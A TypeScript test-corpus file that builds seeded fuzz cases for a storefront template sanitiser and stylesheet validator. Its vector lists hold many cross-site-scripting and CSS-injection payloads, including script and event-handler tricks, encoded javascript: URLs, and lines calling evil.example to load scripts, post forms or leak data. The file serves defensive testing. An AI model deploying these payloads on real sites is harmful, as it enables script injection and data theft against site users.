/**
 * The fuzzed corpus: templates, data and stylesheets with planted escapes,
 * built from a seeded generator so every run (and every engine) sees the same
 * cases. Pure: no Node or DOM API, so the browser parity check bundles it.
 *
 * The planted vectors come from the classes of bypass that have broken real
 * sanitisers: tag and attribute smuggling, raw-text and foreign-content
 * (SVG, MathML) parser switches, `javascript:` / `data:` URLs and their
 * encodings, character-reference tricks, bidi and zero-width characters,
 * CSS `url()` and `expression()`, deep nesting and huge loops.
 */
import type { BlockDeclaration } from './declaration.js';
import type { BlockRenderContext } from './render.js';

const c = (code: number): string => String.fromCodePoint(code);
const RLO = c(0x202e);
const LRI = c(0x2066);
const ZWSP = c(0x200b);
const BOM = c(0xfeff);
const NUL = c(0);
const TAB = c(9);
const LF = c(10);
const TAG_A = c(0xe0041);

/** Markup that must never come out as markup. */
export const MARKUP_VECTORS: readonly string[] = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  '<scr<script>ipt>alert(1)</script>',
  '<<script>script>alert(1)<</script>/script>',
  '</script><script>alert(1)</script>',
  '<script>/*</script><script>*/alert(1)</script>',
  '<script><!--<script></script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<IMG SRC=x OnErRoR=alert(1)>',
  '<img/src/onerror=alert(1)>',
  '<img src="x" onerror="alert(1)"',
  '<img src=`x` onerror=`alert(1)`>',
  '<img src="https://evil.example/pixel.png">',
  '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
  '<img src="https://cdn.tassyir.io/images/abc/public">',
  '<img src="https://cdn.tassyir.io/cdn-cgi/image/w=480,q=80,fit=scale-down,f=auto/images/abc/public" onerror="alert(1)">',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><style><img src=x onerror=alert(1)></style></svg>',
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  '<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>',
  '<svg><set attributeName="onmouseover" to="alert(1)"/></svg>',
  '<svg><use href="data:image/svg+xml,<svg id=x onload=alert(1)>#x"/></svg>',
  '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>',
  '<svg><p><style><img src=x onerror=alert(1)></style></p></svg>',
  '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
  '<svg><path d="M0 0" onclick="alert(1)" fill="url(javascript:alert(1))"/></svg>',
  '<svg><title><img src=x onerror=alert(1)></title></svg>',
  '<math><mi><style><img src=x onerror=alert(1)></style></mi></math>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<template><script>alert(1)</script></template>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)">',
  '<form action="https://evil.example"><input name="phone"><button>Send</button></form>',
  '<input autofocus onfocus=alert(1)>',
  '<textarea></textarea><script>alert(1)</script>',
  '<title><script>alert(1)</script></title>',
  '<xmp><script>alert(1)</script></xmp>',
  '<plaintext><script>alert(1)</script>',
  '<style>body{background:red}</style>',
  '<style>@import url(https://evil.example/x.css);</style>',
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<base href="https://evil.example/">',
  '<details open ontoggle=alert(1)>x</details>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JAVASCRIPT:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  `<a href="java${TAB}script:alert(1)">x</a>`,
  `<a href="java${LF}script:alert(1)">x</a>`,
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="&#x6A;avascript&#x3A;alert(1)">x</a>',
  '<a href="javas&#99;ript:alert(1)">x</a>',
  '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="//evil.example">x</a>',
  '<a href="/\\evil.example">x</a>',
  `<a href="/${TAB}/evil.example">x</a>`,
  '<a href="https://user:pass@evil.example/">x</a>',
  '<a href="https://evil.example:8443/">x</a>',
  '<a href="http://evil.example/">x</a>',
  '<a href="https://example.com/ok" target="_top">x</a>',
  '<a/href="javascript:alert(1)">x</a>',
  '<a href="https://example.com" ping="https://evil.example">x</a>',
  '<button form="order-form" formaction="https://evil.example">Order</button>',
  '<div id="fbq" name="ttq">clobber</div>',
  '<div data-section-id="other" data-action="add">x</div>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<div style="width: expression(alert(1))">x</div>',
  '<div style="position:fixed;inset:0">x</div>',
  '<div class="a b:c" title="t" onclick="alert(1)" onmouseover=alert(1)>x</div>',
  '<p title="&quot; onmouseover=&quot;alert(1)">x</p>',
  `<p title='" onmouseover="alert(1)'>x</p>`,
  '<!--<script>alert(1)</script>-->',
  '<!-- --!><script>alert(1)</script>',
  '<!--><script>alert(1)</script>-->',
  '<![CDATA[<script>alert(1)</script>]]>',
  '<?xml version="1.0"?><script>alert(1)</script>',
  '<!DOCTYPE html><script>alert(1)</script>',
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  '&#60;script&#62;alert(1)&#60;/script&#62;',
  '&#x3C;img src=x onerror=alert(1)&#x3E;',
  '&#0000060script&#0000062;',
  '&lt&gt&amp',
  '&amp;lt;script&amp;gt;',
  '&unknownentity; &#xFFFFFFFF; &#0; &#xD800;',
  `<scr${NUL}ipt>alert(1)</script>`,
  `<scr${ZWSP}ipt>alert(1)</scr${ZWSP}ipt>`,
  `<a href="https://example.com/${RLO}gnp.exe">${RLO}txt.exe</a>`,
  `${LRI}isolated${BOM}text${TAG_A}`,
  '<h1>Second page title</h1>',
  '<table><tr><td>x<script>alert(1)</script></td></tr><td>y</td></table>',
  '<table><caption><svg><style><img src=x onerror=alert(1)>',
  '<select><option><script>alert(1)</script></option></select>',
  '<frameset onload=alert(1)>',
  '<marquee onstart=alert(1)>x</marquee>',
  '<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div>deep',
  '<svg><svg><svg><svg><svg><svg><svg><svg><g><g><g><g><g><g><g><g><g><g><g><g><path d="M0 0"/>',
  '<ul><li>one<li>two</ul></li></ul></div></div>',
  '<a href="/products/x"><a href="/products/y">nested</a></a>',
  '<p><div>block in p</div></p>',
  '<img src="https://cdn.tassyir.io/cdn-cgi/image/w=480,q=80,fit=scale-down,f=auto/images/ok-1/public" alt="ok" width="400">',
  '<meter value="4" min="0" max="5">4</meter><progress value="2" max="5"></progress>',
  '<time datetime="2026-10-16T10:00:00Z">today</time>',
  '<span lang="ar" dir="rtl" role="img" aria-label="x">x</span>',
  '<svg viewbox="0 0 24 24" aria-hidden="true"><path d="M12 2l3 7h7l-5.5 4 2 7-6.5-4.5L5.5 20l2-7L2 9h7z" fill="currentColor"/></svg>',
];

/** Values a template may insert into a URL attribute. */
export const URL_VECTORS: readonly string[] = [
  'javascript:alert(1)',
  ' javascript:alert(1)',
  `java${TAB}script:alert(1)`,
  'jav&#x09;ascript:alert(1)',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  '//evil.example',
  '/\\evil.example',
  `/${TAB}/evil.example`,
  'https://evil.example/" onmouseover="alert(1)',
  "https://evil.example/' onmouseover='alert(1)",
  'https://evil.example/x onmouseover=alert(1)',
  'https://example.com/ok',
  '/collections/all',
  '#reviews',
  `https://example.com/${RLO}x`,
];

/** Text, including invisible and bidi characters, used as data. */
export const TEXT_VECTORS: readonly string[] = [
  'قفطان مطرز',
  'Caftan brodé',
  `${RLO}evil${c(0x202c)}`,
  `zero${ZWSP}width`,
  `${TAG_A}hidden`,
  'Tom & Jerry <b>bold</b>',
  '{{ 7 | times: 7 }}',
  '{% raw %}',
];

/** Stylesheets with planted escapes; the validator must refuse each. */
export const STYLESHEET_VECTORS: readonly string[] = [
  '@import url(https://evil.example/x.css);',
  '@import "https://evil.example/x.css";',
  '@IMPORT "x.css";',
  '@font-face { font-family: x; src: url(https://evil.example/x.woff); }',
  '.a { background: url(https://evil.example/x.png); }',
  '.a { background: url("https://evil.example/x.png"); }',
  ".a { background: url('javascript:alert(1)'); }",
  '.a { background: url(javascript:alert(1)); }',
  '.a { background: url(data:image/svg+xml,x); }',
  '.a { background: image-set("https://evil.example/x.png" 1x); }',
  '.a { width: expression(alert(1)); }',
  '.a { behavior: url(x.htc); }',
  '.a { -moz-binding: url(x.xml#x); }',
  '.a { position: fixed; inset: 0; z-index: 99999; }',
  '.a { position:FIXED }',
  '.a { pos\\69tion: fixed; }',
  '.a { position: f\\69xed; }',
  '.a { color: red } </style><script>alert(1)</script>',
  '.a { content: "</style><script>alert(1)</script>" }',
  '.a { color: red; /* } body { color: red } */',
  '.a { content: "unterminated }',
  '.a { color: red',
  '} body { color: red }',
  '.a { .b { color: red } }',
  '@layer x { .a { color: red } }',
  '@container (min-width: 1px) { .a { color: red } }',
  '@keyframes "spin" { to { opacity: 0 } }',
  '@keyframes none { to { opacity: 0 } }',
  '@media screen { @media screen { @media screen { @media screen { .a { color: red } } } } }',
  '.a { color: var(--st-not-published); }',
  `.a { color: red; }${RLO}`,
  '.a[href^="https://evil"] { background: url(https://evil.example/leak?a); }',
  '.a { background: url(https://cdn.tassyir.io/../evil); }',
  '.a { background: src("https://evil.example/x.png"); }',
];

/** Stylesheets the validator must accept. */
export const STYLESHEET_ACCEPTED: readonly string[] = [
  '.rating { display: flex; gap: var(--st-space, 8px); color: var(--st-text); }',
  '.rating:is(.big, .huge) > span { font-size: 1.25rem; }',
  '@media (min-width: 768px) { .rating { gap: 12px; } }',
  '@supports (display: grid) { .grid { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); } }',
  '@keyframes pop { from { transform: scale(0.9); } to { transform: scale(1); } }',
  '.banner { background: url(https://cdn.tassyir.io/cdn-cgi/image/w=800,q=80,fit=scale-down,f=auto/images/abc/public) center / cover; }',
  '.star::before { content: "\\2605"; color: color-mix(in srgb, var(--st-primary) 80%, white); }',
  '.badge { position: absolute; inset-inline-start: 8px; border-radius: var(--st-radius); }',
];

/** A small deterministic generator (mulberry32). */
export function createRandom(seed: number): () => number {
  let state = seed >>> 0;
  return () => {
    state = (state + 0x6d2b79f5) >>> 0;
    let t = state;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

export interface CorpusCase {
  id: string;
  template: string;
  declaration: BlockDeclaration;
  context: BlockRenderContext;
}

export const CORPUS_DECLARATION: BlockDeclaration = {
  target: 'product',
  settings: [
    { key: 'title', type: 'text', default: 'Title' },
    { key: 'link', type: 'url' },
    { key: 'image', type: 'image' },
  ],
  data: ['store.html', 'store.items', 'store.url', 'product.note'],
};

/** Templates that place a planted value `V` (literal) or data in every
 * position a template can: text, quoted and unquoted attributes, URLs, image
 * sources, tag and attribute names, SVG, tables, captures, filters. */
const SHAPES: readonly ((v: string) => string)[] = [
  (v) => `<div class="box">${v}</div>`,
  (v) => v,
  (v) => `<svg viewBox="0 0 10 10">${v}</svg>`,
  (v) => `<table><tr><td>${v}</td></tr></table>`,
  (v) => `<p>${v}<span>{{ app.data.store.html }}</span></p>`,
  (v) => `{% capture c %}${v}{% endcapture %}{{ c }}${v}`,
  () => '<p>{{ app.data.store.html }}</p>',
  () => '<a href="{{ app.data.store.url }}">{{ app.data.store.html }}</a>',
  () => '<a href={{ app.data.store.url }}>x</a>',
  () => '<img src="{{ app.data.store.url }}" alt="{{ app.data.store.html }}">',
  () =>
    '<img src="{{ product.image | image_url: 400 }}" alt="{{ product.name }}">',
  () => '<{{ app.data.store.html }}>x</{{ app.data.store.html }}>',
  () => '<div {{ app.data.store.html }}>x</div>',
  () =>
    '<div title="{{ app.data.store.html }}" class="{{ block.settings.title }}">{{ product.name | upcase }}</div>',
  () => "<div title='{{ app.data.store.html }}'>{{ product.name }}</div>",
  () =>
    '<a href="{{ block.settings.link }}">{{ block.settings.title | t }}</a>',
  () =>
    '<ul>{% for i in app.data.store.items %}<li title="{{ i }}">{{ i }}</li>{% endfor %}</ul>',
  () => "<div title='{{ 4.5 | stars }}'>{{ 3 | stars }}</div>",
  () =>
    "<p>{{ app.data.store.html | replace: '&', '<' | prepend: '<' | append: '>' }}</p>",
  () =>
    '<p>{{ app.data.store.html | strip_html }}|{{ app.data.store.html | url_encode }}|{{ app.data.store.html | truncate: 12 }}</p>',
  () => "<p>{{ app.data.store.html | split: '' | join: '<' }}</p>",
  () => '<p>{{ app.data.product.note }}{{ product.price | money }}</p>',
  () =>
    '<svg viewBox="0 0 10 10"><path d="{{ app.data.store.html }}" fill="{{ app.data.store.html }}"></path></svg>',
  () => '<{{ "scr" }}ipt>{{ app.data.store.html }}</script>',
];

function pick<T>(random: () => number, list: readonly T[]): T {
  return list[Math.floor(random() * list.length)] as T;
}

function contextWith(random: () => number): BlockRenderContext {
  const items = [
    pick(random, MARKUP_VECTORS),
    pick(random, URL_VECTORS),
    pick(random, TEXT_VECTORS),
  ];
  return {
    store: {
      name: pick(random, TEXT_VECTORS),
      url: 'https://dar-amina.tassyir.io',
      locale: pick(random, ['ar', 'fr', 'en']),
      direction: 'rtl',
      currency: 'DZD',
    },
    product: {
      id: '700000000000000001',
      name: pick(random, [...TEXT_VECTORS, ...MARKUP_VECTORS]),
      url: pick(random, URL_VECTORS),
      price: '4500.00',
      compareAtPrice: '5200.00',
      currency: 'DZD',
      image: pick(random, [
        'https://cdn.tassyir.io/images/kaftan-1/public',
        ...URL_VECTORS,
      ]),
      available: true,
    },
    settings: {
      title: pick(random, [...TEXT_VECTORS, ...MARKUP_VECTORS]),
      link: pick(random, URL_VECTORS),
      image: 'https://cdn.tassyir.io/images/banner/public',
    },
    appData: {
      store: {
        html: pick(random, [
          ...MARKUP_VECTORS,
          ...TEXT_VECTORS,
          ...URL_VECTORS,
        ]),
        url: pick(random, URL_VECTORS),
        items,
      },
      product: { note: pick(random, [...MARKUP_VECTORS, ...TEXT_VECTORS]) },
    },
  };
}

/**
 * Every shape with every markup vector, then `extra` random mixes of shapes,
 * vectors and wrappers. Deterministic for a seed.
 */
export function buildCorpus(seed = 20261016, extra = 1000): CorpusCase[] {
  const random = createRandom(seed);
  const cases: CorpusCase[] = [];
  SHAPES.forEach((shape, s) => {
    const vectors = shape.length === 0 ? [''] : MARKUP_VECTORS;
    vectors.forEach((vector, v) => {
      cases.push({
        id: `shape${s.toString()}-v${v.toString()}`,
        template: shape(vector),
        declaration: CORPUS_DECLARATION,
        context: contextWith(random),
      });
    });
  });
  const wrappers = [
    'div',
    'p',
    'span',
    'a href="/x"',
    'svg',
    'table',
    'ul',
    'details',
    'math',
    'noscript',
    'template',
    'textarea',
    'title',
    'style',
  ];
  for (let n = 0; n < extra; n++) {
    let template = '';
    const parts = 2 + Math.floor(random() * 4);
    for (let p = 0; p < parts; p++) {
      const wrapper = pick(random, wrappers);
      const inner =
        random() < 0.5
          ? pick(random, MARKUP_VECTORS)
          : pick(random, SHAPES)(pick(random, MARKUP_VECTORS));
      const name = wrapper.split(' ')[0] ?? 'div';
      template +=
        random() < 0.3
          ? inner
          : `<${wrapper}>${inner}${random() < 0.7 ? `</${name}>` : ''}`;
    }
    cases.push({
      id: `mix${n.toString()}`,
      template,
      declaration: CORPUS_DECLARATION,
      context: contextWith(random),
    });
  }
  return cases;
}

/** The parts of the package the corpus runs, passed in so the same harness
 * runs against the source, the built file and a browser bundle. */
export interface CorpusApi {
  compileBlockTemplate: (
    source: unknown,
    declaration?: BlockDeclaration,
    options?: { checks?: 'all' | 'syntax' },
  ) =>
    | { ok: true; template: unknown }
    | { ok: false; errors: { code: string; line: number; column: number }[] };
  renderCompiledBlock: (
    template: never,
    context: BlockRenderContext,
  ) =>
    | { ok: true; html: string; stats: { steps: number; bytes: number } }
    | { ok: false; errors: { code: string }[] };
  sanitizeBlockHtml: (html: string) => string;
  validateBlockStylesheet: (
    css: unknown,
  ) => { code: string; line: number; column: number }[];
}

export interface CorpusOutput {
  id: string;
  /** The upload check's error codes (with positions), or [] when accepted. */
  checks: string[];
  /** The render of the template compiled with `checks: 'syntax'`: the HTML,
   * or the error codes. Safety never depends on the upload check. */
  html: string | null;
  renderErrors: string[];
  steps: number;
}

/** Runs the whole corpus. The result is plain JSON: compared byte for byte
 * between Node and browsers. */
export function runCorpus(
  api: CorpusApi,
  cases: readonly CorpusCase[] = buildCorpus(),
): {
  cases: CorpusOutput[];
  sanitized: string[];
  stylesheets: string[][];
} {
  const out: CorpusOutput[] = [];
  for (const item of cases) {
    const strict = api.compileBlockTemplate(item.template, item.declaration);
    const checks = strict.ok
      ? []
      : strict.errors.map(
          (e) => `${e.code}@${e.line.toString()}:${e.column.toString()}`,
        );
    const loose = api.compileBlockTemplate(item.template, item.declaration, {
      checks: 'syntax',
    });
    let html: string | null = null;
    let renderErrors: string[] = [];
    let steps = 0;
    if (loose.ok) {
      const result = api.renderCompiledBlock(
        loose.template as never,
        item.context,
      );
      if (result.ok) {
        html = result.html;
        steps = result.stats.steps;
      } else renderErrors = result.errors.map((e) => e.code);
    } else renderErrors = loose.errors.map((e) => e.code);
    out.push({ id: item.id, checks, html, renderErrors, steps });
  }
  return {
    cases: out,
    sanitized: MARKUP_VECTORS.map((vector) => api.sanitizeBlockHtml(vector)),
    stylesheets: [...STYLESHEET_VECTORS, ...STYLESHEET_ACCEPTED].map((css) =>
      api
        .validateBlockStylesheet(css)
        .map((e) => `${e.code}@${e.line.toString()}:${e.column.toString()}`),
    ),
  };
}
